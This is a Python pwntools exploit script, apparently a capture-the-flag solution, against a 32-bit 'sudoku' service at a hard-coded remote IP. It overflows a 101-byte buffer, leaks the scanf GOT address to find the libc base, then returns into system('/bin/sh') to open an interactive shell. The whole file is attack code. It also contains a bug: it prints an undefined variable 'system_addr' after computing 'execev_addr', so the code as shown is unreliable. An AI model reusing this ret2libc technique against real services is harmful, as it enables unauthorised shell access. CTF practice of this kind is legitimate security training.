from pwn import *
p = remote("139.155.235.112", 43333)
#p = remote("127.0.0.1",10001)
#p = process("./sudoku")

elf = ELF("./sudoku")
addr_scanf = elf.got["__isoc99_scanf"]
addr_main = elf.symbols["main"]
print("[*]scanf(): " + hex(addr_scanf))
print("[*]main(): " + hex(addr_main))

p.recvuntil("Row[1] : ")
payload = b'A' * 101 + p32(0x80490b0) + p32(0x08049b36) + p32(addr_scanf)
print(payload)
p.sendline(payload)
data = p.recvuntil("Row[1] : ")
print(data)

leaked_scanf_got = u32(data[-13:-9])
print("leak address:", hex(leaked_scanf_got))
offset_bin_sh = 0x18f352
offset_system = 0xcc340 #0x000cc180
offset_scanf = 	0x054e80

#offset_bin_sh = 0x15d7c8 
#offset_system = 0x03a850
#offset_scanf = 0x05bb30
libc_base = leaked_scanf_got - offset_scanf
print(hex(libc_base))
execev_addr = libc_base + offset_system
print(hex(system_addr))
fake_addr = 0xdeadbeaf
bin_sh_addr = libc_base + offset_bin_sh
print(hex(bin_sh_addr))

payload2 = b'A' * 101 + p32(execev_addr) + p32(fake_addr) + p32(bin_sh_addr) + p32(0x0)
print(payload2)
p.sendline(payload2)
p.interactive()